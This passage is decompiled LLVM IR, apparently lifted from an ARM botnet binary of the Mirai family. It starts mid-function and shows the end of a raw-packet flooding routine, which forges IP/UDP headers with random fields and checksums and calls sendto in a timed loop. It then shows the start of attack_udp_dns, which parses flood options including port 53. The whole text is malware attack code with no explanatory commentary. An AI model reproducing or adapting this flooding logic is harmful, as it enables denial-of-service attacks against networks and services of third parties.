dec_label_pc_d3d8:                                ; preds = %dec_label_pc_d3a0
  %tmp39 = mul i32 %v7_d2b0, 256
  %v3_d3e0 = and i32 %tmp39, 65280
  store i32 %v3_d3e0, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v0_d3ac, 256
  %v3_d3e4 = and i32 %tmp40, 65280
  %tmp41 = udiv i32 %v7_d2b0, 256
  %v4_d3ec = urem i32 %tmp41, 256
  %v5_d3ec = or i32 %v4_d3ec, %tmp39
  %tmp42 = udiv i32 %v0_d3ac, 256
  %v4_d3f0 = urem i32 %tmp42, 256
  %v5_d3f0 = or i32 %v4_d3f0, %v3_d3e4
  store i32 %v5_d3f0, i32* @lr, align 4
  %tmp43 = mul i32 %v6_d30c, 256
  %v3_d3f4 = and i32 %tmp43, 65280
  store i32 %v3_d3f4, i32* %r2.global-to-local, align 4
  %v5_d3f8 = trunc i32 %v5_d3ec to i16
  %tmp44 = udiv i32 %v6_d30c, 256
  %v4_d400 = urem i32 %tmp44, 256
  %v5_d400 = or i32 %v4_d400, %v3_d3f4
  store i32 %v5_d400, i32* @r6, align 4
  store i32 %v0_d3c4, i32* @r4, align 4
  %sext5 = mul nuw i32 %v5_d3f0, 65536
  %v4_d4d0 = sdiv i32 %sext5, 65536
  %v1_d47c = trunc i32 %v6_d2c8 to i8
  br label %dec_label_pc_d408

dec_label_pc_d408:                                ; preds = %.thread, %dec_label_pc_d3d8
  %v2_d410 = call i32 @calloc(i32 128, i32 1)
  %v3_d414 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d414, i32* %r2.global-to-local, align 4
  %v1_d418 = load i32, i32* @sb, align 4
  %v2_d418 = load i32, i32* @r4, align 4
  %v5_d418 = mul i32 %v2_d418, 4
  %v6_d418 = add i32 %v5_d418, %v1_d418
  %v7_d418 = inttoptr i32 %v6_d418 to i32*
  store i32 %v2_d410, i32* %v7_d418, align 4
  %v0_d41c = load i32, i32* %r2.global-to-local, align 4
  %v3_d41c = mul i32 %v0_d41c, 32
  store i32 %v3_d41c, i32* %r3.global-to-local, align 4
  %v0_d420 = load i32, i32* @sb, align 4
  %v4_d420 = mul i32 %v0_d41c, 4
  %v5_d420 = add i32 %v0_d420, %v4_d420
  %v6_d420 = inttoptr i32 %v5_d420 to i32*
  %v7_d420 = load i32, i32* %v6_d420, align 4
  store i32 %v7_d420, i32* @lr, align 4
  %v5_d424 = mul i32 %v0_d41c, 24
  store i32 %v5_d424, i32* %r3.global-to-local, align 4
  %v1_d428 = load i32, i32* @r8, align 4
  %v2_d428 = add i32 %v1_d428, %v5_d424
  store i32 %v2_d428, i32* @r5, align 4
  %v1_d42c = inttoptr i32 %v7_d420 to i8*
  %v2_d42c = load i8, i8* %v1_d42c, align 1
  %tmp = urem i8 %v2_d42c, 16
  %v1_d430 = zext i8 %tmp to i32
  %v1_d434 = or i32 %v1_d430, 64
  store i32 %v1_d434, i32* %r3.global-to-local, align 4
  %v1_d43c = trunc i32 %v1_d434 to i8
  store i8 %v1_d43c, i8* %v1_d42c, align 1
  %v0_d440 = load i32, i32* @lr, align 4
  %v1_d440 = inttoptr i32 %v0_d440 to i8*
  %v2_d440 = load i8, i8* %v1_d440, align 1
  %v1_d444 = and i8 %v2_d440, -16
  %v1_d448 = or i8 %v1_d444, 5
  store i8 %v1_d448, i8* %v1_d440, align 1
  %v2_d454 = load i32, i32* @lr, align 4
  %v3_d454 = add i32 %v2_d454, 1
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v5_d2ac, i8* %v4_d454, align 1
  %v3_d458 = load i32, i32* %stack_var_-48, align 4
  %v3_d45c = mul i32 %v3_d458, 65536
  %v1_d460 = add i32 %v3_d45c, 2097152
  %v3_d464 = udiv i32 %v1_d460, 256
  %v1_d468 = and i32 %v3_d464, 65280
  %v4_d46c = udiv i32 %v1_d460, 16777216
  %v5_d46c = or i32 %v1_d468, %v4_d46c
  store i32 %v5_d46c, i32* %r3.global-to-local, align 4
  store i32 %v1_d2f4, i32* %r4.global-to-local, align 4
  %v3_d478 = urem i32 %v3_d458, 65536
  store i32 %v3_d478, i32* %r2.global-to-local, align 4
  %v2_d47c = load i32, i32* @lr, align 4
  %v3_d47c = add i32 %v2_d47c, 8
  %v4_d47c = inttoptr i32 %v3_d47c to i8*
  store i8 %v1_d47c, i8* %v4_d47c, align 1
  %v0_d480 = load i32, i32* %r3.global-to-local, align 4
  %v1_d480 = trunc i32 %v0_d480 to i16
  %v2_d480 = load i32, i32* @lr, align 4
  %v3_d480 = add i32 %v2_d480, 2
  %v4_d480 = inttoptr i32 %v3_d480 to i16*
  store i16 %v1_d480, i16* %v4_d480, align 2
  %v0_d484 = load i32, i32* %r2.global-to-local, align 4
  %v1_d484 = mul i32 %v0_d484, 65536
  %v3_d48c = add i32 %v1_d484, 786432
  store i32 %v3_d48c, i32* %r2.global-to-local, align 4
  %v2_d490 = load i32, i32* @lr, align 4
  %v3_d490 = add i32 %v2_d490, 4
  %v4_d490 = inttoptr i32 %v3_d490 to i16*
  store i16 %v5_d3f8, i16* %v4_d490, align 2
  %v0_d494 = load i32, i32* %r2.global-to-local, align 4
  %v3_d494 = udiv i32 %v0_d494, 256
  %v1_d498 = and i32 %v3_d494, 65280
  %v4_d49c = udiv i32 %v0_d494, 16777216
  %v5_d49c = or i32 %v1_d498, %v4_d49c
  store i32 %v5_d49c, i32* %ip.global-to-local, align 4
  %v2_d4a4 = load i32, i32* @lr, align 4
  %v3_d4a4 = add i32 %v2_d4a4, 9
  %v4_d4a4 = inttoptr i32 %v3_d4a4 to i8*
  store i8 17, i8* %v4_d4a4, align 1
  %v0_d4a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d4a8 = icmp eq i32 %v0_d4a8, 0
  store i32 ptrtoint (i32* @global_var_271b8.90 to i32), i32* %r3.global-to-local, align 4
  br i1 %v2_d4a8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d408
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_d4b4 = load i32, i32* @lr, align 4
  %v4_d4b4 = add i32 %v3_d4b4, 6
  %v5_d4b4 = inttoptr i32 %v4_d4b4 to i16*
  store i16 64, i16* %v5_d4b4, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d408, %bb
  %v2_d4b8 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_d4b8, i32* %r2.global-to-local, align 4
  %v1_d4bc = load i32, i32* @lr, align 4
  %v2_d4bc = add i32 %v1_d4bc, 12
  %v3_d4bc = inttoptr i32 %v2_d4bc to i32*
  store i32 %v2_d4b8, i32* %v3_d4bc, align 4
  %v0_d4c0 = load i32, i32* @r5, align 4
  %v1_d4c0 = add i32 %v0_d4c0, 16
  %v2_d4c0 = inttoptr i32 %v1_d4c0 to i32*
  %v3_d4c0 = load i32, i32* %v2_d4c0, align 4
  store i32 %v3_d4c0, i32* %r3.global-to-local, align 4
  %v0_d4c4 = load i32, i32* @lr, align 4
  %v1_d4c4 = add i32 %v0_d4c4, 20
  store i32 %v1_d4c4, i32* %r4.global-to-local, align 4
  %v0_d4c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_d4c8 = trunc i32 %v0_d4c8 to i16
  %v3_d4c8 = add i32 %v0_d4c4, 24
  %v4_d4c8 = inttoptr i32 %v3_d4c8 to i16*
  store i16 %v1_d4c8, i16* %v4_d4c8, align 2
  %v0_d4cc = load i32, i32* %r3.global-to-local, align 4
  %v1_d4cc = load i32, i32* @lr, align 4
  %v2_d4cc = add i32 %v1_d4cc, 16
  %v3_d4cc = inttoptr i32 %v2_d4cc to i32*
  store i32 %v0_d4cc, i32* %v3_d4cc, align 4
  store i32 %v4_d4d0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d4d8 = load i32, i32* @lr, align 4
  %v2_d4d8 = add i32 %v1_d4d8, 28
  %v3_d4d8 = inttoptr i32 %v2_d4d8 to i32*
  store i32 -1, i32* %v3_d4d8, align 4
  %v0_d4dc = load i32, i32* %ip.global-to-local, align 4
  %v1_d4dc = trunc i32 %v0_d4dc to i16
  %v2_d4dc = load i32, i32* %r4.global-to-local, align 4
  %v3_d4dc = add i32 %v2_d4dc, 2
  %v4_d4dc = inttoptr i32 %v3_d4dc to i16*
  store i16 %v1_d4dc, i16* %v4_d4dc, align 2
  %v0_d4e0 = load i32, i32* @lr, align 4
  %v1_d4e0 = add i32 %v0_d4e0, 32
  %v0_d4e4 = load i32, i32* @r6, align 4
  %v1_d4e4 = trunc i32 %v0_d4e4 to i16
  %v3_d4e4 = add i32 %v0_d4e0, 20
  %v4_d4e4 = inttoptr i32 %v3_d4e4 to i16*
  store i16 %v1_d4e4, i16* %v4_d4e4, align 2
  %v3_d4e8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4e8, i32* %r2.global-to-local, align 4
  %v3_d4ec = call i32 @util_memcpy(i32 %v1_d4e0, i32 %v3_d354, i32 %v3_d4e8)
  %v3_d4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d4f0, i32* %r3.global-to-local, align 4
  %v1_d4f4 = add i32 %v3_d4f0, 1
  store i32 %v1_d4f4, i32* @r4, align 4
  %v1_d4f8 = load i32, i32* @fp, align 4
  store i32 %v1_d4f4, i32* %stack_var_-44, align 4
  %v5_d500 = icmp slt i32 %v1_d4f4, %v1_d4f8
  br i1 %v5_d500, label %dec_label_pc_d408, label %dec_label_pc_d504.preheader

dec_label_pc_d504.preheader:                      ; preds = %.thread, %dec_label_pc_d3a0
  %v0_d508.ph = phi i32 [ 0, %dec_label_pc_d3a0 ], [ %v1_d4f8, %.thread ]
  %v3_d520 = icmp eq i32 %v3_d3b4, 65535
  br label %dec_label_pc_d504

dec_label_pc_d504:                                ; preds = %dec_label_pc_d504.preheader, %dec_label_pc_d684.dec_label_pc_d504_crit_edge
  %v0_d508 = phi i32 [ %v0_d508.pre, %dec_label_pc_d684.dec_label_pc_d504_crit_edge ], [ %v0_d508.ph, %dec_label_pc_d504.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d508 = icmp eq i32 %v0_d508, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d508, label %dec_label_pc_d684, label %dec_label_pc_d514

dec_label_pc_d514:                                ; preds = %dec_label_pc_d504
  br label %dec_label_pc_d5c8

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d5c8
  br i1 %v3_d520, label %dec_label_pc_d650, label %dec_label_pc_d528

dec_label_pc_d528:                                ; preds = %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge, %dec_label_pc_d51c
  %v1_d52c = phi i32 [ %v1_d52c.pre, %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge ], [ 65535, %dec_label_pc_d51c ]
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v9_d52c = icmp eq i32 %v3_d3b8, %v1_d52c
  br i1 %v9_d52c, label %dec_label_pc_d664, label %dec_label_pc_d534

dec_label_pc_d534:                                ; preds = %dec_label_pc_d650.dec_label_pc_d534_crit_edge, %dec_label_pc_d528
  %v1_d538 = phi i32 [ %v1_d538.pre, %dec_label_pc_d650.dec_label_pc_d534_crit_edge ], [ %v1_d52c, %dec_label_pc_d528 ]
  store i32 %v3_d3bc, i32* %r3.global-to-local, align 4
  %v9_d538 = icmp eq i32 %v3_d3bc, %v1_d538
  br i1 %v9_d538, label %dec_label_pc_d678, label %dec_label_pc_d540

dec_label_pc_d540:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d534, %dec_label_pc_d678
  store i32 0, i32* @r4, align 4
  %v2_d548 = load i32, i32* @r5, align 4
  %v3_d548 = add i32 %v2_d548, 10
  %v4_d548 = inttoptr i32 %v3_d548 to i16*
  store i16 0, i16* %v4_d548, align 2
  %v0_d54c = load i32, i32* @r5, align 4
  store i32 %v0_d54c, i32* @r0, align 4
  %v2_d550 = call i32 @checksum_generic(i32 %v0_d54c, i32 20)
  %v3_d550 = trunc i32 %v2_d550 to i16
  %v3_d554 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d554, i32* %r3.global-to-local, align 4
  %v3_d558 = load i32, i32* @r5, align 4
  %v4_d558 = add i32 %v3_d558, 10
  %v5_d558 = inttoptr i32 %v4_d558 to i16*
  store i16 %v3_d550, i16* %v5_d558, align 2
  %v0_d55c = load i32, i32* @r6, align 4
  store i32 %v0_d55c, i32* @r1, align 4
  %v1_d560 = add i32 %v0_d55c, 4
  %v2_d560 = inttoptr i32 %v1_d560 to i16*
  %v3_d560 = load i16, i16* %v2_d560, align 2
  %v4_d560 = zext i16 %v3_d560 to i32
  store i32 %v4_d560, i32* %r2.global-to-local, align 4
  %v0_d564 = load i32, i32* @r4, align 4
  %v1_d564 = trunc i32 %v0_d564 to i16
  %v3_d564 = add i32 %v0_d55c, 6
  %v4_d564 = inttoptr i32 %v3_d564 to i16*
  store i16 %v1_d564, i16* %v4_d564, align 2
  %v0_d568 = load i32, i32* %r3.global-to-local, align 4
  %v1_d568 = add i32 %v0_d568, 12
  store i32 %v1_d568, i32* %r3.global-to-local, align 4
  %v0_d56c = load i32, i32* @r5, align 4
  %v4_d570 = call i32 @checksum_tcpudp(i32 %v0_d56c, i32 %v0_d55c, i32 %v4_d560, i32 %v1_d568)
  %v5_d570 = trunc i32 %v4_d570 to i16
  %v3_d574 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d574, i32* %r3.global-to-local, align 4
  %v3_d578 = mul i32 %v3_d574, 32
  store i32 %v3_d578, i32* %lr.global-to-local, align 4
  %v3_d57c = load i32, i32* @r6, align 4
  %v4_d57c = add i32 %v3_d57c, 6
  %v5_d57c = inttoptr i32 %v4_d57c to i16*
  store i16 %v5_d570, i16* %v5_d57c, align 2
  %v0_d580 = load i32, i32* %lr.global-to-local, align 4
  %v1_d580 = load i32, i32* %r3.global-to-local, align 4
  %tmp45 = mul i32 %v1_d580, -8
  %v5_d580 = add i32 %v0_d580, %tmp45
  store i32 %v5_d580, i32* %lr.global-to-local, align 4
  %v0_d584 = load i32, i32* @r6, align 4
  %v1_d584 = add i32 %v0_d584, 2
  %v2_d584 = inttoptr i32 %v1_d584 to i16*
  %v3_d584 = load i16, i16* %v2_d584, align 2
  %v4_d584 = zext i16 %v3_d584 to i32
  store i32 %v4_d584, i32* @r6, align 4
  %v3_d588 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d588, i32* %r2.global-to-local, align 4
  %v1_d58c = load i32, i32* @r8, align 4
  %v2_d58c = add i32 %v1_d58c, %v5_d580
  store i32 %v2_d58c, i32* @lr, align 4
  %v3_d590 = add i32 %v2_d58c, 2
  %v4_d590 = inttoptr i32 %v3_d590 to i16*
  store i16 %v3_d584, i16* %v4_d590, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d59c = load i32, i32* @r5, align 4
  %v0_d5a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5a0 = add i32 %v0_d5a0, 32
  store i32 %v1_d5a0, i32* %r2.global-to-local, align 4
  %v0_d5a4 = load i32, i32* @sl, align 4
  %v0_d5a8 = load i32, i32* @lr, align 4
  %v6_d5b0 = call i32 @__libc_sendto(i32 %v0_d5a4, i32 %v0_d59c, i32 %v1_d5a0, i32 16384, i32 %v0_d5a8, i32 16)
  %v3_d5b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d5b4, i32* %r3.global-to-local, align 4
  %v1_d5b8 = add i32 %v3_d5b4, 1
  %v1_d5bc = load i32, i32* @fp, align 4
  store i32 %v1_d5b8, i32* %stack_var_-44, align 4
  %v6_d5c4 = icmp slt i32 %v1_d5b8, %v1_d5bc
  br i1 %v6_d5c4, label %dec_label_pc_d5c8, label %dec_label_pc_d684

dec_label_pc_d5c8:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d514
  %v1_d5d8 = phi i32 [ %v1_d5b8, %dec_label_pc_d540 ], [ 0, %dec_label_pc_d514 ]
  %v5_d5cc = mul i32 %v1_d5d8, 24
  %v1_d5d0 = load i32, i32* @r8, align 4
  %v2_d5d0 = add i32 %v1_d5d0, %v5_d5cc
  store i32 %v2_d5d0, i32* %r3.global-to-local, align 4
  %v1_d5d4 = add i32 %v2_d5d0, 20
  %v2_d5d4 = inttoptr i32 %v1_d5d4 to i8*
  %v3_d5d4 = load i8, i8* %v2_d5d4, align 1
  %v4_d5d4 = zext i8 %v3_d5d4 to i32
  store i32 %v4_d5d4, i32* %r2.global-to-local, align 4
  %v0_d5d8 = load i32, i32* @sb, align 4
  %v4_d5d8 = mul i32 %v1_d5d8, 4
  %v5_d5d8 = add i32 %v0_d5d8, %v4_d5d8
  %v6_d5d8 = inttoptr i32 %v5_d5d8 to i32*
  %v7_d5d8 = load i32, i32* %v6_d5d8, align 4
  store i32 %v7_d5d8, i32* @r5, align 4
  store i32 65535, i32* @r7, align 4
  %v1_d5e8 = add i32 %v7_d5d8, 20
  store i32 %v1_d5e8, i32* @r6, align 4
  %tmp46 = icmp ugt i8 %v3_d5d4, 31
  br i1 %tmp46, label %dec_label_pc_d51c, label %dec_label_pc_d5f0

dec_label_pc_d5f0:                                ; preds = %dec_label_pc_d5c8
  %v1_d5f0 = add i32 %v2_d5d0, 16
  %v2_d5f0 = inttoptr i32 %v1_d5f0 to i32*
  %v3_d5f0 = load i32, i32* %v2_d5f0, align 4
  store i32 %v3_d5f0, i32* %r4.global-to-local, align 4
  %v0_d5f4 = call i32 @rand_next()
  %v3_d5f8 = load i32, i32* %stack_var_-44, align 4
  %v5_d600 = mul i32 %v3_d5f8, 24
  %v1_d604 = and i32 %v3_d5f0, 16711680
  store i32 %v1_d604, i32* %ip.global-to-local, align 4
  %v3_d608 = udiv i32 %v3_d5f0, 16777216
  %v4_d60c = udiv i32 %v1_d604, 256
  %v5_d60c = or i32 %v4_d60c, %v3_d608
  store i32 %v5_d60c, i32* %r2.global-to-local, align 4
  %v1_d610 = load i32, i32* @r8, align 4
  %v2_d610 = add i32 %v1_d610, %v5_d600
  %v1_d614 = and i32 %v3_d5f0, 65280
  store i32 %v1_d614, i32* %r3.global-to-local, align 4
  %v1_d618 = add i32 %v2_d610, 20
  %v2_d618 = inttoptr i32 %v1_d618 to i8*
  %v3_d618 = load i8, i8* %v2_d618, align 1
  %v4_d618 = zext i8 %v3_d618 to i32
  store i32 %v4_d618, i32* %ip.global-to-local, align 4
  %v5_d620 = call i32 @llvm.bswap.i32(i32 %v3_d5f0)
  %v7_d624 = lshr i32 %v0_d5f4, %v4_d618
  %v8_d624 = add i32 %v7_d624, %v5_d620
  store i32 %v8_d624, i32* %r2.global-to-local, align 4
  %v5_d640 = call i32 @llvm.bswap.i32(i32 %v8_d624)
  store i32 %v5_d640, i32* %r3.global-to-local, align 4
  %v1_d644 = load i32, i32* @r7, align 4
  %v9_d644 = icmp eq i32 %v3_d3b4, %v1_d644
  %v1_d648 = load i32, i32* @r5, align 4
  %v2_d648 = add i32 %v1_d648, 16
  %v3_d648 = inttoptr i32 %v2_d648 to i32*
  store i32 %v5_d640, i32* %v3_d648, align 4
  br i1 %v9_d644, label %dec_label_pc_d650, label %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge

dec_label_pc_d5f0.dec_label_pc_d528_crit_edge:    ; preds = %dec_label_pc_d5f0
  %v1_d52c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d528

dec_label_pc_d650:                                ; preds = %dec_label_pc_d5f0, %dec_label_pc_d51c
  %v0_d650 = call i32 @rand_next()
  %v1_d650 = trunc i32 %v0_d650 to i16
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v1_d658 = load i32, i32* @r7, align 4
  %v9_d658 = icmp eq i32 %v3_d3b8, %v1_d658
  %v3_d65c = load i32, i32* @r5, align 4
  %v4_d65c = add i32 %v3_d65c, 4
  %v5_d65c = inttoptr i32 %v4_d65c to i16*
  store i16 %v1_d650, i16* %v5_d65c, align 2
  br i1 %v9_d658, label %dec_label_pc_d664, label %dec_label_pc_d650.dec_label_pc_d534_crit_edge

dec_label_pc_d650.dec_label_pc_d534_crit_edge:    ; preds = %dec_label_pc_d650
  %v1_d538.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d534

dec_label_pc_d664:                                ; preds = %dec_label_pc_d650, %dec_label_pc_d528
  %v0_d664 = call i32 @rand_next()
  %v1_d664 = trunc i32 %v0_d664 to i16
  store i32 %v3_d3bc, i32* %r3.global-to-local, align 4
  %v1_d66c = load i32, i32* @r7, align 4
  %v9_d66c = icmp eq i32 %v3_d3bc, %v1_d66c
  %v3_d670 = load i32, i32* @r5, align 4
  %v4_d670 = add i32 %v3_d670, 20
  %v5_d670 = inttoptr i32 %v4_d670 to i16*
  store i16 %v1_d664, i16* %v5_d670, align 2
  br i1 %v9_d66c, label %dec_label_pc_d678, label %dec_label_pc_d540

dec_label_pc_d678:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d534
  %v0_d678 = call i32 @rand_next()
  %v1_d678 = trunc i32 %v0_d678 to i16
  %v3_d67c = load i32, i32* @r6, align 4
  %v4_d67c = add i32 %v3_d67c, 2
  %v5_d67c = inttoptr i32 %v4_d67c to i16*
  store i16 %v1_d678, i16* %v5_d67c, align 2
  br label %dec_label_pc_d540

dec_label_pc_d684:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d504
  %v2_d688 = call i32 @__GI_time(i32* null)
  store i32 %v2_d33c, i32* %ip.global-to-local, align 4
  %v6_d694 = icmp slt i32 %v2_d33c, %v2_d688
  br i1 %v6_d694, label %dec_label_pc_d698, label %dec_label_pc_d684.dec_label_pc_d504_crit_edge

dec_label_pc_d684.dec_label_pc_d504_crit_edge:    ; preds = %dec_label_pc_d684
  %v0_d508.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_d504

dec_label_pc_d698:                                ; preds = %dec_label_pc_d684, %entry, %dec_label_pc_d6a4
  %v1_d6a0 = phi i32 [ %v3_d368, %entry ], [ %v1_d6a8, %dec_label_pc_d6a4 ], [ %v2_d688, %dec_label_pc_d684 ]
  store i32 %v3_d248, i32* %r4.global-to-local, align 4
  store i32 %v27_d248, i32* %lr.global-to-local, align 4
  ret i32 %v1_d6a0

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d378
  %v0_d6a4 = load i32, i32* @sl, align 4
  %v1_d6a8 = call i32 @__GI___libc_close(i32 %v0_d6a4)
  br label %dec_label_pc_d698

; uselistorder directives
  uselistorder i32 %v5_d640, { 1, 0 }
  uselistorder i32 %v3_d5f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_d5b8, { 1, 2, 0 }
  uselistorder i32 %v5_d580, { 1, 0 }
  uselistorder i32 %v0_d55c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d4f4, { 1, 0, 2 }
  uselistorder i32 %v3_d458, { 1, 0 }
  uselistorder i32 %v0_d41c, { 1, 2, 0 }
  uselistorder i32 %v3_d3f4, { 1, 0 }
  uselistorder i32 %v3_d3b4, { 0, 2, 1 }
  uselistorder i32 %v0_d3ac, { 1, 0, 2 }
  uselistorder i32 %v3_d368, { 1, 2, 3, 0 }
  uselistorder i32 %v2_d33c, { 1, 0 }
  uselistorder i32 %v6_d30c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_d2f4, { 1, 0 }
  uselistorder i32 %v6_d2c8, { 1, 0 }
  uselistorder i32 %v7_d2b0, { 1, 0, 2 }
  uselistorder i32 %v5_d28c, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder label %dec_label_pc_d698, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d540, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d504, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_d6b4 = load i32, i32* @sb, align 4
  %v27_d6b4 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d6e4 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_d6e8 = load i32, i32* @r4, align 4
  store i32 %v0_d6e8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d6f4 = load i32, i32* @sl, align 4
  store i32 %v0_d6f4, i32* %r3.global-to-local, align 4
  %v0_d6f8 = load i32, i32* @r5, align 4
  store i32 %v0_d6f8, i32* %r0.global-to-local, align 4
  %v5_d6fc = inttoptr i32 %v0_d6e8 to i32*
  %v6_d6fc = call i32 @attack_get_opt_int(i32 %v0_d6f8, i32* %v5_d6fc, i32 2, i32 %v0_d6f4)
  %v1_d708 = urem i32 %v6_d6fc, 256
  store i32 %v1_d708, i32* %ip.global-to-local, align 4
  %v0_d70c = load i32, i32* @r4, align 4
  store i32 %v0_d70c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d718 = load i32, i32* @r5, align 4
  store i32 %v0_d718, i32* %r0.global-to-local, align 4
  %v6_d720 = inttoptr i32 %v0_d70c to i32*
  %v7_d720 = call i32 @attack_get_opt_int(i32 %v0_d718, i32* %v6_d720, i32 3, i32 65535)
  %v0_d724 = load i32, i32* @r4, align 4
  store i32 %v0_d724, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d734 = load i32, i32* @r5, align 4
  store i32 %v0_d734, i32* %r0.global-to-local, align 4
  %v5_d738 = inttoptr i32 %v0_d724 to i32*
  %v6_d738 = call i32 @attack_get_opt_int(i32 %v0_d734, i32* %v5_d738, i32 4, i32 64)
  %v0_d740 = load i32, i32* @r4, align 4
  store i32 %v0_d740, i32* %r1.global-to-local, align 4
  %v1_d744 = urem i32 %v6_d738, 256
  store i32 %v1_d744, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_d74c = load i32, i32* @sl, align 4
  store i32 %v0_d74c, i32* %r3.global-to-local, align 4
  %v0_d750 = load i32, i32* @r5, align 4
  store i32 %v0_d750, i32* %r0.global-to-local, align 4
  %v6_d758 = inttoptr i32 %v0_d740 to i32*
  %v7_d758 = call i32 @attack_get_opt_int(i32 %v0_d750, i32* %v6_d758, i32 5, i32 %v0_d74c)
  %v1_d764 = urem i32 %v7_d758, 256
  store i32 %v1_d764, i32* %ip.global-to-local, align 4
  %v0_d768 = load i32, i32* @r4, align 4
  store i32 %v0_d768, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d774 = load i32, i32* @r5, align 4
  store i32 %v0_d774, i32* %r0.global-to-local, align 4
  %v5_d77c = inttoptr i32 %v0_d768 to i32*
  %v6_d77c = call i32 @attack_get_opt_int(i32 %v0_d774, i32* %v5_d77c, i32 6, i32 65535)
  %v0_d780 = load i32, i32* @r4, align 4
  store i32 %v0_d780, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v0_d790 = load i32, i32* @r5, align 4
  store i32 %v0_d790, i32* %r0.global-to-local, align 4
  %v5_d794 = inttoptr i32 %v0_d780 to i32*
  %v6_d794 = call i32 @attack_get_opt_int(i32 %v0_d790, i32* %v5_d794, i32 7, i32 53)
  %v0_d79c = load i32, i32* @r4, align 4
  store i32 %v0_d79c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v0_d7ac = load i32, i32* @r5, align 4
  store i32 %v0_d7ac, i32* %r0.global-to-local, align 4
  %v5_d7b0 = inttoptr i32 %v0_d79c to i32*
  %v6_d7b0 = call i32 @attack_get_opt_int(i32 %v0_d7ac, i32* %v5_d7b0, i32 9, i32 65535)
  %v0_d7b4 = load i32, i32* @r4, align 4
  store i32 %v0_d7b4, i32* %r1.global-to-local, align 4
